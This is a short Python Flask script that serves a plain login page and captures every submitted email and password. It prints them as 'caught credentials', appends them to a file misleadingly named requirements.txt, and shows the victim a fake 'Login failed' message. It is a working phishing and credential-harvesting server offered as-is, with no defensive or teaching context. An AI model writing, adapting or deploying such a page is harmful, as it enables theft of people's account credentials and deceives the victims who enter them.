from flask import Flask, request

app = Flask(__name__)

@app.route('/')
def index():
    return """
        <!DOCTYPE html>
        <html>
        <head>
            <title>Login</title>
            <style>
            body{
            background-color: red;
            }
            </style>
        </head>
        <body>
            <h2>Login</h2>
            <form action='/login' method='post'>
                <label>Email:</label><br>
                <input type='text' name='email'><br>
                <label>Password:</label><br>
                <input type='password' name='password'><br><br>
                <input type='submit' value='Login'>
            </form>
        </body>
        </html>
    """

@app.route('/login', methods=['POST'])
def login():
    email = request.form.get('email')
    password = request.form.get('password')

    print(f"[+] Caught credentials: {email} | {password}")

    with open('requirements.txt', 'a') as f:
        f.write(f"{email} | {password}\n")

    return "Login failed. Try again later."

if __name__ == "__main__":
    app.run(host="0.0.0.0", port=5000)
